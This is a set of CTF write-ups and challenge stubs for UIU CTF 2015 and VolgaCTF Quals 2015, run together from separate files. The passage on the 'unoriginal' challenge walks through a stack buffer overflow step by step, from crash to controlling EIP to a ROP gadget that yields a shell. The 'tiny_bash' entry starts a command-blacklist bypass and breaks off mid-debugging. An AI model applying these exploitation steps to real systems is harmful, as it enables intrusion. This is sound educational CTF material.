The message is: ZmxhZ3todHRwczovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PXpkQV9fMnRL
b0lVfQ==

Annie
```
But from the == signs at the end of the message, it looks like base64 encoding.
Indeed, decoding the message using base46 yields:
```
flag{https://www.youtube.com/watch?v=zdA__2tKoIU}
```

## Other write-ups and resources

* <http://bobbyblues.com/misc/CTF/uiu2015-ovaltine/># UIU CTF 2015: sniffthis

**Category:** Network
**Points:** 200
**Solves:** 30
**Description:** 

> NETWORK: Just say no. [traffic.7z](https://ctf.acm.illinois.edu/archive/traffic.7z)

## Write-up

by [bobbyblues](https://github.com/bobbyblues)

This challenge consists in a pcap file for network traffic.
Let's export the HTTP objects and browse the files.
In the middle of a lot of Pandora traffic, we find key.gif and key.bmp.
Sadly, none of them can be opened with an image viewer, and they both contain the same text:
```
$cat key.gif
<html>
<head><title>301 Moved Permanently</title></head>
<body bgcolor="white">
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx</center>
</body>
</html>
```

Apparently, the images were moved to another location.
Let's search for that new location in the capture.
Searching for the string "key.bmp" in wireshark returns a packet with the following url:
<https://www.dropbox.com/s/1x6rspz1tf7fvmk/key.bmp>

Visiting the page allows us to download the actual file which still doesn't correspond to an actual image.
```
$file key.bmp 
key.bmp: Microsoft Word 2007+
```
It is actually a word document, so let's open it with our favorite word processor:
![Original word document](word1.png)
This looks like a false lead, but if we remove the image, we can reveal the flag:
![Flag revealed](word2.png)

## Other write-ups and resources

* <http://www.bobbyblues.com/misc/CTF/uiu2015-sniffthis/>
* <http://www.gameofpwnz.com/?p=102># UIU CTF 2015: okami

**Category:** Pwnable
**Points:** 300
**Solves:** 6
**Description:** 

> PWN: If you pwn this [challenge](okami1), one could say that you're a god... okami.uiuc.sexy port 1235.

## Write-up

(TODO)

## Other write-ups and resources

* none yet# UIU CTF 2015: unoriginal

**Category:** Pwnable
**Points:** 100
**Solves:** 22
**Description:** 

> PWN: Ah, but this challenge at unoriginal.uiuc.sexy port 1235 is so [unoriginal](unoriginal) :( .

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <https://gist.github.com/emyei/5f60c733761573b760d2>

### Meta

* Stack Buffer Overflow `sbo`, `jump to register`

We are given a i386 32bit non-stripped ELF for Linux:

```bash
$ file unoriginal 
unoriginal: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=05553bc7eda7c492d2a2fead35eccc12d746fff7, not stripped
```

Running it:

```bash
$ ./unoriginal 
Hack the Planet!
hello?
```

We can provide input after the initial banner `Hack the Planet!`.

`checksec`:

```bash
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
```

Everything is turned off - so we can e.g. provide shellcode to the stack to be executed! Good news (for us)!

Let's try to provide some more input and check for a Stack Buffer Overflow:

```bash
$ p -c 'print "A"*0x500' | ./unoriginal 
Hack the Planet!
Segmentation fault (core dumped)
```

Bingo! Let's have a closer look with `ltrace`:

```bash
$ p -c 'print "A"*0x500' | ltrace -s 256 -f ./unoriginal 2> /tmp/out
Hack the Planet!
$ cat /tmp/out 
[pid 2387] __libc_start_main(0x8048449, 1, 0xffc026a4, 0x8048480 <unfinished ...>
[pid 2387] puts("Hack the Planet!")                                                                                                                                                                                           = 17
[pid 2387] read(0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 256) = 256
[pid 2387] --- SIGSEGV (Segmentation fault) ---
[pid 2387] +++ killed by SIGSEGV +++
```

Ok looks like the binary reads `256` bytes from our input with `read`.

Let's create a pattern with size `256` with `gdb-peda`:

```bash
gdb-peda$ pattern_create 256
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%b'
```

And provide it to the binary while executing it with `strace`:

```bash
$ echo -n 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%b' | strace -s 256 -f ./unoriginal 2>/tmp/out 
Hack the Planet!
Segmentation fault (core dumped)
$ cat /tmp/out 
execve("./unoriginal", ["./unoriginal"], [/* 32 vars */]) = 0
[ Process PID=2435 runs in 32 bit mode. ]
brk(0)                                  = 0x97de000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff77d7000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=117029, ...}) = 0
mmap2(NULL, 117029, PROT_READ, MAP_PRIVATE, 3, 0) = 0xfffffffff77ba000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib32/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\300\233\1\0004\0\0\0\204\214\32\0\0\0\0\0004\0 \0\n\0(\0C\0B\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\264\207\26\0\264\207\26\0\264\207\26\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4H\32\0\4H\32\0\5\0\0\0\0\20\0\0\1\0\0\0\320Q\32\0\320Q\32\0\320Q\32\0\354,\0\0\254X\0\0\6\0\0\0\0\20\0\0\2\0\0\0\250m\32\0\250m\32\0\250m\32\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0D\0\0\0D\0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\320Q\32\0\320Q\32\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1742588, ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff77b9000
mmap2(NULL, 1747580, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xfffffffff760e000
mmap2(0xf77b3000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a5000) = 0xfffffffff77b3000
mmap2(0xf77b6000, 10876, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xfffffffff77b6000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff760d000
set_thread_area(0xff8e4b50)             = 0
mprotect(0xf77b3000, 8192, PROT_READ)   = 0
mprotect(0xf77f9000, 4096, PROT_READ)   = 0
munmap(0xf77ba000, 117029)              = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 4), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff77d6000
write(1, "Hack the Planet!\n", 17)      = 17
read(0, "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%b", 256) = 256
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414341} ---
+++ killed by SIGSEGV (core dumped) +++
```

We can see in the second-last line in `si_addr` the overwritten RIP causing the Segmentation Fault, `0x41414341`.

Having the endianess in mind, we convert this address back to a string `ACAA` and look for the offset and thus the length needed to overwrite `EIP` using `gdb-peda`'s `pattern_offset`:

```bash
gdb-peda$ pattern_offset ACAA
ACAA found at offset: 17
```

So we have to provide `17` bytes to overwrite `EIP`.

Testing it again:

```bash
$ p -c 'import sys; sys.stdout.write("A"*17+"BBBB")'                                                                                                                                                                                                                                                                                                                 
AAAAAAAAAAAAAAAAABBBB$ p -c 'import sys; sys.stdout.write("A"*17+"BBBB")' | strace -s 256 -f ./unoriginal 
execve("./unoriginal", ["./unoriginal"], [/* 32 vars */]) = 0
[...]
read(0, "AAAAAAAAAAAAAAAAABBBB", 256)   = 21
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
+++ killed by SIGSEGV (core dumped) +++
Segmentation fault (core dumped)
```

`si_addr` is indeed `0x42424242` == `BBBB`.

We can control `EIP` now. However, we need to redirect `EIP` to a valid, executable stack address, which we can't leak.

So that means we have to redirect `EIP` to static addresses in the binary (starting with `0804....`), which leaves us with the option `ROP`.

Our goal, as in [this challenge](https://github.com/ctfs/write-ups-2015/blob/f8e2f4b7159b774e694357dba83559687a46ffb0/nullcon-hackim-2015/exploit-1/README.md) is to find a gadget allowing us to either let `EIP` jump to the current stack position without having to provide any valid stack address.

[This writeup](https://gist.github.com/emyei/5f60c733761573b760d2) found a `push esp; nop; <...>; nop; mov ebx, [esp]; ret` gadget, which leads to this solution:

* Overwrite `EIP` with the address of the gadget, `0x8048350`
* Right after that, provide our shellcode
* After a `ret` from the current function calling `read` is executed, `EIP` will jump to the gadget, executing it
* `esp`, in the meantime, will point to our shellcode
* The gadget essentially pushes the current stack pointer `esp` address to the stack
* After a unnecessary `mov ebx, [esp]`, `ret` is executed, forcing `EIP` to jump to whatever `esp` is currently pointing to
* Our shellcode is thus executed, providing us with a shell!

[This python script](./solve.py) does the job:

```bash
K$ p solve.py 
[+] Started program './unoriginal'
[*] Switching to interactive mode
$ ls f*
flag.txt
$ cat flag.txt
flag{actually_the_flag_is_unknown}
$ ^D
[*] Stopped program './unoriginal'
```

PS: TODO or FIX is that it doesn't work remotely.

## Other write-ups and resources

* <https://gist.github.com/emyei/5f60c733761573b760d2>
* <http://pastebin.com/UZrf2RJ5># UIU CTF write-ups

* <https://ctf.acm.illinois.edu/about>
* [Scoreboard](https://ctf.acm.illinois.edu/scoreboard) or [local alternative](scoreboard)
* [Number of solves per task](solves.txt)

## Completed write-ups

* [network/ovaltine](network/ovaltine)
* [network/sniffthis](network/sniffthis)
* [pwn/unoriginal](pwn/unoriginal)

## External write-ups only

* [stego/qr](stego/qr)
* [web/hype](web/hype)

## Missing write-ups

* [forensics/the-gibson](forensics/the-gibson)
* [pwn/okami](pwn/okami)
* [recon/incertia](recon/incertia)
* [recon/luckdragon](recon/luckdragon)
* [reverse/refun](reverse/refun)
* [reverse/rise](reverse/rise)
* [reverse/the-one-that-solves-itself](reverse/the-one-that-solves-itself)
* [reverse/uiucd](reverse/uiucd)
* [trivia/bobby](trivia/bobby)
* [trivia/eff](trivia/eff)
* [trivia/mung](trivia/mung)
* [trivia/type1](trivia/type1)
* [trivia/type2](trivia/type2)
* [web/secpaste](web/secpaste)
* [web/toosecure](web/toosecure)# UIU CTF 2015: incertia

**Category:** Recon
**Points:** 100
**Solves:** 17
**Description:** 

> RECON: Virtual pixels are great.

## Write-up

(TODO)

## Other write-ups and resources

* none yet# UIU CTF 2015: luckdragon

**Category:** Recon
**Points:** 200
**Solves:** 26
**Description:** 

> RECON: [f41c0r](https://twitter.com/f41c0r) thinks he's so good at OPSEC that nobody could find him from just knowing his handle. Prove him wrong, and find his legal first and last name.

## Write-up

(TODO)

## Other write-ups and resources

* none yet# UIU CTF 2015: refun

**Category:** Reverse
**Points:** 300
**Solves:** 13
**Description:** 

> RE: Find the correct key to fill in [key.txt](key.txt) - [binary](refun).

## Write-up

(TODO)

## Other write-ups and resources

* none yet# UIU CTF 2015: RISE

**Category:** Reverse
**Points:** 400
**Solves:** 3
**Description:** 

> RE: Can you [RISE](https://ctf.acm.illinois.edu/rise.uiuc.sexy) to the occasion? "nc rise.uiuc.sexy 9999" [Some code](rise.py).

## Write-up

(TODO)

## Other write-ups and resources

* none yet# UIU CTF 2015: The One That Solves Itself

**Category:** Reverse
**Points:** 400
**Solves:** 1
**Description:** 

> RE: We think we've got something revolutionary here and are glad you signed up to try it. Please allow us to introduce (what might be) the world's first self-solving CTF challenge! All you need to do is run this handy-dandy malwa^H^H^H^H^Hkey retrieval tool and wait. The flag will be revealed to you with no effort required on your part! It just might not get there until the some time on 4/5.
> 
> Notes:
> -The challenge is written to simulate malware. It's not "supposed to" do any actual damage, however it will exhibit some malware-like behaviours. Running the code in a safe environment (like a VM) is advised. In the event you don't have one available, check out modern.ie.
> 
> -In the event you need to remove the challenge, simply kill it from your task manager of choice and then re-run it with the single argument '1' (ex. CTFMalware.exe 1)
> 
> -Most files that the malware will fetch only exist for a brief window, but the files containing the keys will be accessible for the duration of the event. You just need to find them. Or let the [malware](CTFMalware.exe) do it for you.

## Write-up

(TODO)

## Other write-ups and resources

* none yet# UIU CTF 2015: UIUCD

**Category:** Reverse
**Points:** 300
**Solves:** 11
**Description:** 

> RE: [cdkey_server](cdkey_server) - Copy of the server code that checks the flag. The actual flag is replaced with "Success! Please enter your CD Key on the server to retrieve the flag!". If you see that message pop up, then enter in your correct CD key to [our server](https://cd.uiuc.sexy/), on port 6543 to get the flag. To run, type "./cdkey_server "
> 
> [cdkey_client](cdkey_client) - Run this to submit your flag to the server. To run, type "./cdkey_client ". It will then prompt you to enter your CD key in.

## Write-up

(TODO)

## Other write-ups and resources

* none yet# UIU CTF 2015: QR

**Category:** Stegano
**Points:** 200
**Solves:** 20
**Description:**

> STEGO: This [QR code](qr.tar.gz) might not be as quick a response as usual!

## Write-up

(TODO)

## Other write-ups and resources

* [b01lers](https://b01lers.net/challenges/UIUCTF/QR/42/)
# UIU CTF 2015: Bobby

**Category:** Trivia
**Points:** 10
**Solves:** 197
**Description:** 

> TRIVIA: What's Bobby Tables's real name?

## Write-up

(TODO)

## Other write-ups and resources

* none yet# UIU CTF 2015: eff

**Category:** Trivia
**Points:** 10
**Solves:** 111
**Description:** 

> TRIVIA: While lots of fundraisers for the EFF are held every year at DEFCON, this one is the most stylish.

## Write-up

(TODO)

## Other write-ups and resources

* none yet# UIU CTF 2015: MUNG

**Category:** Trivia
**Points:** 10
**Solves:** 154
**Description:** 

> TRIVIA: What MIT student group defined the term MUNG as the recursive algorithm MUNG Until No Good.

## Write-up

(TODO)

## Other write-ups and resources

* none yet# UIU CTF 2015: type1

**Category:** Trivia
**Points:** 10
**Solves:** 188
**Description:** 

> TRIVIA: Defcon CTF is a famous example of this style of ctf competition.

## Write-up

(TODO)

## Other write-ups and resources

* none yet# UIU CTF 2015: type2

**Category:** Trivia
**Points:** 10
**Solves:** 188
**Description:** 

> TRIVIA: This style of competition is more commonly found in an online-only format, as it is much easier to run than the other major style of CTF.

## Write-up

(TODO)

## Other write-ups and resources

* none yet# UIU CTF 2015: hype

**Category:** Web
**Points:** 100
**Solves:** 17
**Description:**

> WEB: A lot of [Hyperboria](http://a050032a39d870de1be70314b90d0917.tk/) related things are often abbreviated with [hype](https://www.youtube.com/watch?v=B3vkL1nxQDI)

## Write-up

(TODO)

## Other write-ups and resources

* <http://capturetheswag.blogspot.com.au/2015/04/uiuctf-2015-hype-web-challenge.html>
* [b01lers](https://b01lers.net/challenges/UIUCTF/hype/41/)
# UIU CTF 2015: secpaste

**Category:** Web
**Points:** 500
**Solves:** 0
**Description:** 

> WEB: Grab the [paste](http://securepastelololol.tk/) with title = "flag".

## Write-up

(TODO)

## Other write-ups and resources

* none yet# UIU CTF 2015: toosecure

**Category:** Web
**Points:** 300
**Solves:** 8
**Description:** 

> toosecure: 300 Unsolved
> WEB: Wow, only $400 to your name? Wonder if this [new bank](http://toosecure.uiuc.sexy/) could help you change that...

## Write-up

(TODO)

## Other write-ups and resources

* none yet# VolgaCTF Quals CTF 2015: remote-web

**Category:** Admin
**Points:** 200
**Solves:** 57
**Description:**

> There is a web server somewhere (10.0.1.18), but we have forgotten a port number. Can you GET something from it?
> 
> ssh:team@194.190.143.247
> pass:volgactf123

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.rogdham.net/2015/05/03/volgactf-2015-quals-write-ups.en> 
# VolgaCTF Quals CTF 2015: Carry

**Category:** Crypto
**Points:** 500
**Solves:** 34
**Description:**

> Here's a bunch of files. Someone has done something with these files (apparently, encrypted). To get the flag decrypt everything.
> 
> [files](http://files.2015.volgactf.ru/carry/data.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.rogdham.net/2015/05/03/volgactf-2015-quals-write-ups.en> 
* <http://capturetheswag.blogspot.com.au/2015/05/volga-ctf-2015-carry-500-point-crypto.html>
# VolgaCTF Quals CTF 2015: cpkc

**Category:** Crypto
**Points:** 400
**Solves:** 9
**Description:**

> A home-brewed cryptosystem, should be easy to break. Its keyspace seems to be rather large though...
> 
> [script](http://files.2015.volgactf.ru/cpkc/cpkc.py)
> [key](http://files.2015.volgactf.ru/cpkc/key.public)
> [ciphertext](http://files.2015.volgactf.ru/cpkc/ciphertext.bin)

## Write-up

(TODO)

## Other write-ups and resources

* <http://mslc.ctf.su/wp/volgactf-quals-2015-cpkc-crypto-400-writeup/>
# VolgaCTF Quals CTF 2015: gostfuscator

**Category:** Crypto | Reverse
**Points:** 250
**Solves:** 43
**Description:**

> Try to solve a riddle
> [link](http://files.2015.volgactf.ru/gostfuscator/task.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <https://www.whitehatters.academy/volgactf-2015-gostfuscator/>
# VolgaCTF Quals CTF 2015: lcg

**Category:** Crypto
**Points:** 100
**Solves:** 144
**Description:**

> Check out our brand-new cipher. It's super-fast and moderately secure.
> 
> [script](http://files.2015.volgactf.ru/lcg/lcg.py)
> [ciphertext](http://files.2015.volgactf.ru/lcg/flag.png.bin)

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.rogdham.net/2015/05/03/volgactf-2015-quals-write-ups.en>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/blob/master/2015/VOLGACTF/crypto/lcg/README.md>
# VolgaCTF Quals CTF 2015: rsa

**Category:** Crypto
**Points:** 200
**Solves:** 100
**Description:**

> The oldie but goodie.
> 
> [script](http://files.2015.volgactf.ru/rsa/decryptor.py)
> [key](http://files.2015.volgactf.ru/rsa/key.public)
> [ciphertext](http://files.2015.volgactf.ru/rsa/ciphertext.bin)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/VOLGACTF/crypto/rsa> 
# VolgaCTF Quals CTF 2015: Russian doll

**Category:** Crypto | Forensics
**Points:** 300
**Solves:** 28
**Description:**

> We got a strange file, can you find a flag in it [image](http://files.2015.volgactf.ru/russian_doll/russian_doll.iso)

[Alternative download](https://mega.nz/#!HR8jyQ4Y!0S1bkjoSfIDfaUCCewMmw9elWxX1RulQ23ad1snsYPw)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/VOLGACTF/forensics/russiandoll>
# VolgaCTF Quals CTF 2015: rusty idea

**Category:** Crypto | Reverse
**Points:** 600
**Solves:** 1
**Description:**

> We've managed to intercept a transmission of an encrypted file and even the beginning of the corresponding plaintext. Also we have the binary that must have been used to encrypt the plaintext. Could you please decrypt the whole thing?
> 
> [encryptor](http://files.2015.volgactf.ru/rusty_idea/icipher)
> [ciphertext](http://files.2015.volgactf.ru/rusty_idea/text.txt.bin)
> [plaintext](http://files.2015.volgactf.ru/rusty_idea/text.txt)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# VolgaCTF Quals CTF 2015: homework

**Category:** Joy
**Points:** 100
**Solves:** 101
**Description:**

> My dog has eaten my homework. Please help restore it!
> 
> [homework](http://files.2015.volgactf.ru/homework/homework.jpg)

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.rogdham.net/2015/05/03/volgactf-2015-quals-write-ups.en>
* <http://lockboxx.blogspot.com/2015/05/volgactf-2015-quals-writeup-homework.html>
# VolgaCTF Quals CTF 2015: relax & enjoy

**Category:** Joy
**Points:** 150
**Solves:** 73
**Description:**

> Steampunk not dead, as well as these cars! Relax and enjoy!
> flag format: <brand0><brand1>...<brandN>, no capital letters, no spaces, no separators.
> 
> [relax_enjoy](http://files.2015.volgactf.ru/relax_enjoy/relax_enjoy.wmv)

[Alternative download](https://mega.nz/#!ORVkGBRb!oTVpMkTkjwETLVeMECaElYkXShliwGBpSJCXFoXEvw8)

## Write-up

(TODO)

## Other write-ups and resources

* <http://dakutenpura.hatenablog.com/entry/2015/05/05/002719>
# VolgaCTF Quals CTF 2015: world art

**Category:** Joy
**Points:** 200
**Solves:** 54
**Description:**

> We need the first two letters of street names concatenated (in the lowercase).
> 
> [world_art](http://files.2015.volgactf.ru/world_art/world_art.rar)

## Write-up

(TODO)

## Other write-ups and resources

* <https://www.whitehatters.academy/volgactf-2015-worldart/>
# VolgaCTF Quals CTF 2015: mathproblem

**Category:** PPC
**Points:** 300
**Solves:** 106
**Description:**

> nc mathproblem.2015.volgactf.ru 8888

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.rogdham.net/2015/05/03/volgactf-2015-quals-write-ups.en>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/blob/master/2015/VOLGACTF/misc/mathproblem/solution/mathsolve.py>
* <https://www.whitehatters.academy/volgactf-2015-mathproblem/>
* <https://github.com/Team-Sportsball/CTFs-2015/blob/master/VolgaCTF/Mathproblem.md>
* <http://dakutenpura.hatenablog.com/entry/2015/05/05/005522>
# VolgaCTF Quals CTF 2015: bash

**Category:** PWN
**Points:** 125
**Solves:** 84
**Description:**

> just another super-puper secure shell
> 
> nc bash.2015.volgactf.ru 7777
> [tiny_bash](http://files.2015.volgactf.ru/bash/tiny_bash)

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <http://www.rogdham.net/2015/05/03/volgactf-2015-quals-write-ups.en>
* <http://www.mrt-prodz.com/blog/view/2015/05/volgactf-2015-quals---bash-125pts-writeup>
* <https://www.whitehatters.academy/volgactf-2015-bash/>
* <http://ww9210.cn/2015/05/04/volgactf-writeupinterstellar-tiny_bash-mathproblem-database-pwnie/>

### Meta

Keywords:

* Bash Blacklist Evasion
* Command Injection `ci`
* File Descriptor Redirection

We are given a x86-64bit non-stripped ELF for Linux:

```bash
$ file tiny_bash 
tiny_bash: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=579021b3f75dc0c9734d4f1f408e5669b6a97d48, not stripped
```

Running it:

```bash
$ ./tiny_bash 
Usage: bash port
```

Let's give it a port:

```bash
$ ./tiny_bash 6666

```

Ok looks like it does something, maybe it listen on this port?

`nc` to it to find out:

```bash
$ nc localhost 6666
Welcome to our small secure shell.You are disallowed to execute several types ofcommands.Are you able to bypass these restrictions?
>> ls
This command is prohibited.
>> help
```

So we can input commands and some seems to be blacklisted.

Listing the functions using `radare2` yields several functions:

```bash
[0x00400ba0]> afl | sort -k1 | column -t
0x004009b8  26   3   sym._init
[...]
0x00400b90  16   2   sym.imp.socket
0x00400ba0  42   1   entry0
0x00400bd0  48   4   sym.deregister_tm_clones
0x00400c00  64   4   sym.register_tm_clones
0x00400c40  28   3   sym.__do_global_dtors_aux
0x00400c60  45   4   sym.frame_dummy
0x00400c8d  50   5   sym.reap_exited_processes
0x00400cbf  51   1   sym.sock_send
0x00400cf2  80   7   sym.check_command
0x00400d42  361  11  sym.process_connection
0x00400eab  798  19  sym.main
0x004011d0  101  4   sym.__libc_csu_init
[...]
```

Between `frame_dummy` and the first function beginning with `__` are the non-imported functions that have been defined for this challenge.

THe most interesting functions seem to be:

* `sym.main`
* `sym.check_command`
* `sym.process_connection`

Looking at the graph of `sym.check_command` (`VV @ sym.process_connection`), we see something interesting:

![](./process-connection.png)

* Coming from `0x00400dd2`, the node containing `sym.check_command` passes the command, stored in buffer `rbp-local_8` to it.
* If the result is `t`rue, it seems that `system` is called, probably on our command

Let's have a look at `sym.check_command` (press `g`o to [`i`]) :

![](./check-command.png)

Looks like `strstr` is called, probably on our command and compared with the object `obj.commands`, which should contain all commands that are prohibited and thus blacklisted. However, it seems to be empty and filled during runtime.

Press `p` once to see the addresses and write down the address (`0x00400cfe`) that copies `obj.commands` to the buffer at `rbp-local_1`:

![](./check-command-2.png) 

Let's run it with `gdb-peda` after setting a breakpoint at that address:

`server`:

```bash
$ gdb ./tiny_bash
Reading symbols from ./tiny_bash...(no debugging symbols found)...done.
gdb-peda$ b *0x00400cfe
Breakpoint 1 at 0x400cfe
gdb-peda$ r 6666
Starting program: /home/vbox/pwn/tasks/volgactf/bash/tiny_bash 6666
<...>
```

`client`:

```bash
$ nc localhost 6666
Welcome to our small secure shell.You are disallowed to execute several types ofcommands.Are you able to bypass these restrictions?
>> ls

```

Back to `server`:

```bash
Starting program: /home/vbox/pwn/tasks/volgactf/bash/tiny_bash 6666
Accepted connection from 127.0.0.1
[New process 2879]
User request: ls

[Switching to process 2879]
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffe2a0 --> 0xa736c ('ls\n')
RBX: 0x0 
RCX: 0x11 
RDX: 0x7ffff7dd59e0 --> 0x0 
RSI: 0x7fffffee 
RDI: 0x7fffffffe2a0 --> 0xa736c ('ls\n')
RBP: 0x7fffffffe270 --> 0x7fffffffe2e0 --> 0x7fffffffe400 --> 0x0 
RSP: 0x7fffffffe250 --> 0x4 
RIP: 0x400cfe (<check_command+12>:      mov    QWORD PTR [rbp-0x8],0x602140)
R8 : 0x0 
R9 : 0x0 
R10: 0x7ffff7dd26a0 --> 0x0 
R11: 0x246 
R12: 0x400ba0 (<_start>:        xor    ebp,ebp)
R13: 0x7fffffffe4e0 --> 0x2 
R14: 0x0 
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400cf3 <check_command+1>:  mov    rbp,rsp
   0x400cf6 <check_command+4>:  sub    rsp,0x20
   0x400cfa <check_command+8>:  mov    QWORD PTR [rbp-0x18],rdi
=> 0x400cfe <check_command+12>: mov    QWORD PTR [rbp-0x8],0x602140
   0x400d06 <check_command+20>: jmp    0x400d2f <check_command+61>
   0x400d08 <check_command+22>: mov    rax,QWORD PTR [rbp-0x8]
   0x400d0c <check_command+26>: mov    rdx,QWORD PTR [rax]
   0x400d0f <check_command+29>: mov    rax,QWORD PTR [rbp-0x18]
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe250 --> 0x4 
0008| 0x7fffffffe258 --> 0x7fffffffe2a0 --> 0xa736c ('ls\n')
0016| 0x7fffffffe260 --> 0x0 
0024| 0x7fffffffe268 --> 0x7ffff7ffe1c8 --> 0x0 
0032| 0x7fffffffe270 --> 0x7fffffffe2e0 --> 0x7fffffffe400 --> 0x0 
0040| 0x7fffffffe278 --> 0x400e3f (<process_connection+253>:    test   eax,eax)
0048| 0x7fffffffe280 --> 0x0 
0056| 0x7fffffffe288 --> 0x4ffffe400 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000000000400cfe in check_command ()
gdb-peda$ x/20wx 0x602140
0x602140 <commands>:    0x0040131a      0x00000000      0x0040131e      0x00000000
0x602150 <commands+16>: 0x00401323      0x00000000      0x00401327      0x00000000
0x602160 <commands+32>: 0x0040132c      0x00000000      0x00401333      0x00000000
0x602170 <commands+48>: 0x00401336      0x00000000      0x00401339      0x00000000
0x602180 <commands+64>: 0x0040133c      0x00000000      0x00401343      0x00000000
gdb-peda$ x/s 0x0040131a
0x40131a:       "cat"
gdb-peda$ x/s 0x0040131e
0x40131e:       "flag"
gdb-peda$ x/69wx 0x602140
0x602140 <commands>:    0x0040131a      0x00000000      0x0040131e      0x00000000
0x602150 <commands+16>: 0x00401323      0x00000000      0x00401327      0x00000000
0x602160 <commands+32>: 0x0040132c      0x00000000      0x00401333      0x00000000
0x602170 <commands+48>: 0x00401336      0x00000000      0x00401339      0x00000000
0x602180 <commands+64>: 0x0040133c      0x00000000      0x00401343      0x00000000
